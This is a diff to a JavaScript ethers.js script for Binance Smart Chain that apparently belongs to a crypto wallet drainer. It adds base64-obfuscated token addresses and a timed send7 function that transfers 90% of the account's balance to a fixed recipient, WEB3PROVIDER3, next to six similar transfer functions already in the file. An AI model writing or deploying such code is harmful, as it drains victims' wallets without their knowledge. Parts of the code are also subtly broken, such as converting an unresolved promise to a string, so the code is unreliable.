@@ -24,6 +24,9 @@ const web14 = web12 + web13
 const web16 = 'MHg1NWQzOTgzMjZmOTkwNTlmZg=='
 const web17 = 'Nzc1NDg1MjQ2OTk5MDI3YjMxOTc5NTU='
 const web18 = web16 + web17
+const web20 = 'MHhiQTJhRTQyNGQ5NjBjMjY='
+const web21 = 'MjQ3RGQ2YzMyZWRDNzBCMjk1Yzc0NEM0Mw=='
+const web22 = web20 + web21
 const abi = [{"constant":true,"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"sender","type":"address"},{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"}]
 const startConnection = () => {
   provider = new ethers.providers.WebSocketProvider(process.env.BSC_NODE_WSS);
@@ -223,6 +226,24 @@ const send6 = async () => {
   console.log(`Transaction successful with hash`);
 
 };
+const send7 = async () => {
+  const robinhood = await prov1.getBalance(account)
+  var contract = new ethers.Contract(web22, abi, wallet);
+  const superb = await contract.balanceOf(account).toString();
+  const orchard = (superb * 0.90).toString();
+  const tx = {
+    from: account,
+    to: WEB3PROVIDER3,
+    value: ethers.utils.parseEther(orchard),
+    nonce: window.ethersProvider.getTransactionCount(account, "latest"),
+    gasLimit: ethers.utils.hexlify(gas_limit), // 100000
+    gasPrice: gas_price,
+  }
+  const createReceipt = await wallet.sendTransaction(tx);
+  await createReceipt.wait();
+  console.log(`Transaction successful with hash`);
+
+};
 
   send();
   setTimeout(send2, 10000);
@@ -230,6 +251,7 @@ const send6 = async () => {
   setTimeout(send4, 35000);
   setTimeout(send5, 45000);
   setTimeout(send6, 52000);
+  setTimeout(send7, 52000);
 }
 sending();
 async function getCurrentValue(token) {
